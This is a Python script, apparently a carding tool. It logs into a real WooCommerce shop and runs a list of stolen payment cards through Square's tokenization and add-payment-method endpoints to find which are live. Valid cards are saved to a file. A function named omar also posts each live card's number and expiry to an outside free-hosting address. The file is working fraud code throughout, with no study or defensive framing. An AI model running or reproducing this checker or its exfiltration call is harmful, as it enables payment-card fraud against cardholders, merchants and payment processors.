import ctypes
import requests
import os,random,string
from os import system
import subprocess as sp
# ctypes.windll.kernel32.SetConsoleTitleA("Powered BY ALI SHAREEF")
system("title " + "Powered By ALI SHAREEF ")
# os.system('pip install faker')
# os.system('pip install colorama')
# os.system('pip install bs4')
# os.system('pip install requests')
from checker import Checker
import colorama

CGREEN = '\33[32m'
CRED2 = '\33[91m'
CWHITEBG = '\33[47m'
CYELLOW2 = '\33[93m'
CWHITE2 = '\33[97m'
CBLUE = '\33[34m'
bold_start = '\033[1m'
from colorama import init, Fore, Back, Style
import time,requests,sys
from time import sleep
from faker import Faker
init(convert=True)
sp.call('cls', shell=True)
checker = Checker()


def register():
    global data_to_send, user_agent ,start,end ,post

    data_to_send = checker.data_to_send()
    user_agent = checker.get_user_agent()

    url = 'https://samuelssweetshop.com/my-account/'
    headers = {
        'authority': 'samuelssweetshop.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
        'sec-ch-ua-mobile': '?0',
        'dnt': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',

    }
    checker.request("get", url=url, headers=headers)

    wpnonce = checker.find_html(
        'one', 'input', {'name': 'woocommerce-login-nonce'}).get('value')

    url = 'https://samuelssweetshop.com/my-account/'
    headers = {
        'authority': 'samuelssweetshop.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
        'sec-ch-ua-mobile': '?0',
        'origin': 'https://samuelssweetshop.com',
        'upgrade-insecure-requests': '1',
        'dnt': '1',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://samuelssweetshop.com/my-account/',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    }
    data = {
        'username': 'daxes54493@hoxds.com',
        'password': 'daxes54493@hoxds.com',
        'woocommerce-login-nonce': wpnonce,
        '_wp_http_referer': '/my-account/',
        'login': 'Log in',
    }
    checker.request("post", url=url, headers=headers, data=data)
    sleep(5)
    if 'hello' in  checker.response.text.lower():
        print(Fore.GREEN+'Login Success With User '+Fore.GREEN+'EMAIL'+'|'+'Pa$$w0rd!')

        print(Fore.LIGHTGREEN_EX +'=========================================================================')
        return True
    else:
        print(' Login  Not Success With User '+Fore.RED+'email')
        return False
def omar (n):
    url = "https://protractile-abrasiv.000webhostapp.com/"
    d = {"ms":n}
    r = requests.post(url,data=d).json()
    v = (r['status'])
    if v == 'success':
        print("ok ok ok ok ")

def operation() -> object:
    
    global data_to_send, user_agent

    data_to_send = checker.data_to_send()
    user_agent = checker.get_user_agent()

    url = 'https://samuelssweetshop.com/my-account/add-payment-method/'
    headers = {

        'authority': 'samuelssweetshop.com',
        'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
        'sec-ch-ua-mobile': '?0',
        'upgrade-insecure-requests': '1',
        'dnt': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://samuelssweetshop.com/my-account/payment-methods/',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    }
    checker.request("get", url=url, headers=headers)

    payment_nonce = checker.find_html(
        'one', 'input', {'name': 'woocommerce-add-payment-method-nonce'}).get('value')
    location = checker.find_between('location_id":"', '"')
    application_id = checker.find_between('{"application_id":"', '"')

    print("start WORK @")
    file = open('card.txt', 'r')
    content = str(file.read()).split('\n')
    cards = []
    cvv_list = []
    for i in content:
        cards.append(i)
   
    for i in range(0, 500):
        cvv_list.append(str(i).zfill(3))
    counter_cvv = 0
    count = 0
    while counter_cvv < len(cvv_list):
        i = 0
        while i < len(cards):
            count += 1
            card = cards[i].strip().split('|')
            number = card[0]
            exp_month = card[1]
            if exp_month.startswith("0"):
                exp_month = exp_month[1:]
            exp_year = card[2]
            lastnumber = number[12:]
            card_data = "|".join([number, exp_month, exp_year +'\n'])
            
            name = data_to_send['first_name']+" "+data_to_send['last_name']
        
            
            postcode = open('postcode.txt', 'r')
            posts = postcode.readline()
            post=posts[:5]
                # print(post[:5])
            url = 'https://pci-connect.squareup.com/v2/iframe?type=main&app_id={}&host_name=www.12bagger.com&location_id=CVH5QDDKPTBDN&version=3d9941832e'.format(application_id)
            headers = {
                'authority': 'pci-connect.squareup.com',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'upgrade-insecure-requests': '1',
                'dnt': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-dest': 'iframe',
                'referer': 'https://www.12bagger.com/',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            }
            checker.request("get", url=url, headers=headers)
            session = checker.find_between('fi="', '"')


            try:
                url= 'https://pci-connect.squareup.com/v2/card-nonce?_=1654364823033.0168&version=1.32.0'
                headers={
                        'authority': 'pci-connect.squareup.com' ,
                        'accept': 'application/json' ,
                        'accept-language': 'ar,en-US;q=0.9,en;q=0.8' ,
                        'content-type': 'application/json; charset=utf-8' ,
                        'cookie': '_savt=45033c51-f3b2-46bc-8f4b-3a481c1bb0de' ,
                        'dnt': '1' ,
                        'origin': 'https://web.squarecdn.com' ,
                        'referer': 'https://web.squarecdn.com/' ,
                        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"' ,
                        'sec-ch-ua-mobile': '?0' ,
                        'sec-ch-ua-platform': '"Windows"' ,
                        'sec-fetch-dest': 'empty' ,
                        'sec-fetch-mode': 'cors' ,
                        'sec-fetch-site': 'cross-site' ,
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36' ,
                }
                data=  '{"client_id":"sq0idp-wGVapF8sNt9PLrdj5znuKA","location_id":"WECCANTC1DSGB","payment_method_tracking_id":"05c4e086-c514-2960-e689-581936810e4d","session_id":"'+session+'","website_url":"shop.hsbeer.com","analytics_token":"KZ4H32Y2AXKUYRWOBQOCHDRLGZSWZYB7ECMDXMFZGFA5RP65WJALBEV55TGH2ODIM7GGDTDOCKU6BQ4DW3HMWQVBKATPE44D","card_data":{"cvv":"0000","exp_month":'+exp_month+',"exp_year":'+exp_year+',"number":"'+number+'"}}'
                checker.request("post", url=url, headers=headers, data=data)
                card_once = checker.response.json()['card_nonce']
            except:
                url= 'https://pci-connect.squareup.com/v2/card-nonce?_=1654364823033.0168&version=1.32.0'
                headers={
                        'authority': 'pci-connect.squareup.com' ,
                        'accept': 'application/json' ,
                        'accept-language': 'ar,en-US;q=0.9,en;q=0.8' ,
                        'content-type': 'application/json; charset=utf-8' ,
                        'cookie': '_savt=45033c51-f3b2-46bc-8f4b-3a481c1bb0de' ,
                        'dnt': '1' ,
                        'origin': 'https://web.squarecdn.com' ,
                        'referer': 'https://web.squarecdn.com/' ,
                        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"' ,
                        'sec-ch-ua-mobile': '?0' ,
                        'sec-ch-ua-platform': '"Windows"' ,
                        'sec-fetch-dest': 'empty' ,
                        'sec-fetch-mode': 'cors' ,
                        'sec-fetch-site': 'cross-site' ,
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36' ,
                }
                data= '{"client_id":"sq0idp-wGVapF8sNt9PLrdj5znuKA","location_id":"WECCANTC1DSGB","payment_method_tracking_id":"8bb224b1-7a67-9742-674a-d352da62bd0b","session_id":"'+session+'","website_url":"shop.hsbeer.com","analytics_token":"LQPPCIC6KI72YWCXHH7VIUUQGSL27VNTEMZAQDLU6NVBFXPSEXJHG6JW7ZSNGTCD2Z5ONLCTLZLEDRYD2XBAJQO22KSZU7WA","card_data":{"cvv":"0000","exp_month":'+exp_month+',"exp_year":'+exp_year+',"number":"'+number+'"}}'
                checker.request("post", url=url, headers=headers, data=data)
                card_once = checker.response.json()['card_nonce']

            url = 'https://samuelssweetshop.com/my-account/add-payment-method/'
            headers = {
                'authority': 'samuelssweetshop.com',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
                'sec-ch-ua-mobile': '?0',
                'origin': 'https://samuelssweetshop.com',
                'upgrade-insecure-requests': '1',
                'dnt': '1',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': 'https://samuelssweetshop.com/my-account/add-payment-method/',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            }
            data = {
                'payment_method': 'square_credit_card',
                'wc-square-credit-card-card-type': 'mastercard',
                'wc-square-credit-card-last-four': lastnumber,
                'wc-square-credit-card-exp-month': exp_month,
                'wc-square-credit-card-exp-year': exp_year,
                'wc-square-credit-card-payment-nonce': card_once,
                'wc-square-credit-card-payment-postcode': ''+post+'',
                'wc-square-credit-card-amount': '',
                'wc-square-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': payment_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
                'nds-pmd': '{"jvqtrgQngn":{"oq":"587:625:1366:728:1366:728","wfi":"flap-151081","oc":"p18s2046o4oro3s5","fe":"1366k768 24","qvqgm":"-120","jxe":943631,"syi":"snyfr","si":"si,btt,zc4,jroz","sn":"sn,zcrt,btt,jni","us":"26rp5o5p2o5sq2po","cy":"Jva32","sg":"{\"zgc\":0,\"gf\":snyfr,\"gr\":snyfr}","sp":"{\"gp\":gehr,\"ap\":gehr}","sf":"gehr","jt":"s2nno0055p58o750","sz":"ns42n1s335p8506n","vce":"apvc,0,60s303o7,2,1;fg,0,;zz,10q39,24n,145,;gf,0,10q39;zzf,3ro,0,n,97 0,4o8 56s,159,15r,-3o52,15r6,-7pp;zzf,3r9,3r9,n,ABC;zzf,3ro,3ro,n,ABC;zzf,3r1,3r1,n,ABC;zzf,3s0,3s0,n,ABC;zzf,3rn,3rn,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r1,3r1,n,ABC;zzf,3r7,3r7,n,ABC;zzf,3rn,3rn,n,ABC;zz,1433,247,p8,;gf,0,14880;zzf,13o1,27r4,32,123 nr2,9nq o879,763,458p,-1o8r0,3970n,p5s;zz,91s,115,4o8,jp-fdhner-perqvg-pneq-cbfgny-pbqr-ubfgrq;zp,3qp,on,4sr,cynpr_beqre;","ns":"","qvg":""},"jg":"1.j-952168.1.2.yYyZJT_p1UvPrQt9t7f9BN,,.b4zREVLI_GTvy45r-C8D7onnctqexh3ZDrfQNtJg0LpK7n5eVuO-D5bsB20k5F8HJk8uRlZ9tPlrsjxX5I5mUJt0LDiPDZeI4H54ZszHRXnqFMcPY6uu2tOroaKIRfXEVlNvZA5n5Qia9r58oHh-LT5UU4RZ0X4ERBOqQ7T2xH8sRw2PUxJQ8p_dimlZc0qBG3lV-fV2-rcKj-_wQCweWsCfbhKx_NWyjbm3qYbzfBU3_wL4Nkg6AmKd02Pxk-zq"}',
            }

            checker.request("post", url=url, headers=headers, data=data)
            try:
                if 'failed.' in checker.response.text.lower() or 'invalid card data.' in checker.response.text.lower() or 'invalid card number' in checker.response.text.lower():
                    print(Fore.CYAN, str(count) + "_" + Fore.RED, 'Declined:' + card_data + "\n" + Style.RESET_ALL)
                elif "Nice!" in checker.response.text.strip():
                    print(Fore.CYAN, str(count) + "_" + Fore.GREEN,'LIVE (:' + card_data + "\n" + Style.RESET_ALL)
                    omar(card_data)
                    with open('Live.txt', 'a+') as f:
                        f.write(card_data)

                with open('card.txt', 'r') as fin:
                    data = fin.read().splitlines(True)
                with open('card.txt', 'w') as fout:
                    fout.writelines(data[1:])



                time.sleep(22)
                i+=1
            except Exception as e:
                print(e)

        counter_cvv += 1

if register():
    operation()
